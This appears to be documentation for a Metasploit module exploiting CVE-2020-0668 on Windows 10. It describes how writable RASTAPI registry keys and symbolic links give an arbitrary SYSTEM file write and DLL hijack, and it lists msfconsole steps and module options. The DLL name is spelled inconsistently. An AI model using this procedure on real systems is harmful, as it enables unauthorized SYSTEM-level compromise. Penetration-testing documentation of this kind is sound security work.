## Vulnerable Application

Windows 10 x64 build versions 17134-18363

On builds prior to 17134, the file copy takes place, but it copies the
logfile rather than the payload.  it is possible that tweaking the
MaxSize registry value will affect this, but I found not value that
worked.

### Introduction

This module makes changes to the filesystem that cannot be removed
without Administrative access and a reboot happens.  Specifically, the
payload C:\windows\system32\WindowsCoreDeviceInfo.dll will be held open
by the RasMan Service until a reboot.  That also rpevents removal of the
directories (if any) that were created. I was not able to stop the
service without a reboot to allow file removal.

This module crashes occasionally when writing to
HKLM\SOFTWARE\Microsoft\Tracing\RASTAPI.  If that happens, you cannot
re-run the module, as there will be a name collision for the symlinks
required.  It might be nice to add a way to clean that up, as it
requires the use of the WindowsAPI through railgun.

The Remote Access Service runs as system and creates a log of its
actions called RASTAPI.LOG. Once the RASTAPI.LOG reaches a defined size,
the Remote Access Service copies RASTAPI.LOG to RASTAPI.OLD in the same
directory.
The issue is twofold. First, the behavior of the Remote Access Service
Tool API is defined by three registry keys:

* HKLM\SOFTWARE\Microsoft\Tracing\RASTAPI\EnableFileTracing
* HKLM\SOFTWARE\Microsoft\Tracing\RASTAPI\FileDirectory
* HKLM\SOFTWARE\Microsoft\Tracing\RASTAPI\new_size

These three registry keys allow a user to turn on the RASTAPI and
configure the size and location of the log file. These registry keys are
writable by a regular user.

The second issue is that the RAST service performs only a trivial check
on the filesystem location of the RASTAPI.OLD destination. If an
attacker creates a filesystem link between the old log destination
(i.e. C:\users\user\temp\RASTAPI.OLD) and a trusted location
(C:\windows\system32\badfile.dll), RASDIALER will copy the old log file
to the linked location as the SYSTEM user. In this case, we write to
C:\windows\system32\windowscoredeviceinfo.dll and then take advantage of
a hijacking vulnerability in the System Orchestrator service.

The attack looks something like:

1. Gain lower-privileged access to a vulnerable target.
1. Create a dummy directory to hold files.
1. Mount the dummy directory to \RPC Control
1. Upload a dll payload
1. Create a link between \RPC Control\RASTAPI.LOG and the uploaded
   payload
1. Create a link between \RPC Control\RASTAPI.OLD and the destination
   location the attacker would like to write (in this module,
   C:\Windows\system32\WindowsCreDeviceInfo.dll)
1. Write the registry keys to turn on FileTracing, set the file
   directory to the dummy directory, and set the max file size to one
   byte less than the size of the payload,
1. Upload a configuration file for the rasdialer
1. Launch the rasdialer. When RAST service kicks off, it tries to write
   a log file to the directory specified in the registry, but it finds
   one already exists, and it is already full, so RAST service then
   copies the file to the “old” location that’s linked to the trusted
   location. The result is an arbitrary file write to a trusted
   location.
1. At this point, the overwrite is complete and we launch a trigger
   starting the System Orchestrator service which loads the overwritten
   dll.

## Verification Steps

  1. Start msfconsole
  2. Get a session with basic privileges
  3. Do: ```use exploit/windows/local/cve_2020_0668_service_tracing```
  4. Do: ```set payload windows/x64/<payload>```
  5. Do: ```set SESSION <sess_no>```
  6. Do: ```run```
  7. You should get a shell running as SYSTEM after several minutes.

## Options

  **EXPLOIT_DIR**
  Directory to use for file upload and linking; this should not already
  exist.  The directory cannot be deleted until after a reboot.

  **OVERWRITE_DLL**
  Overwrite WindowsCreDeviceInfo.dll if it exists (false by default).
  WindowsCoreDeviceInfo.dll is not present by default, but if it is
  present, it is likely loaded, so even with this set to true, the
  overwrite (and exploit) will fail.

  **PAYLOAD_UPLOAD_NAME**
  The filename to use for the payload binary (%RAND% by default).
  This is the name of the dll payload when uploaded to the remote host.

  **PHONEBOOK_UPLOAD_NAME**
  The name of the phonebook file to trigger RASDIAL (%RAND% by default).
  The rasdialer trigger requires a config file; this is the name of the
  xml file required to trigger the RAST service.
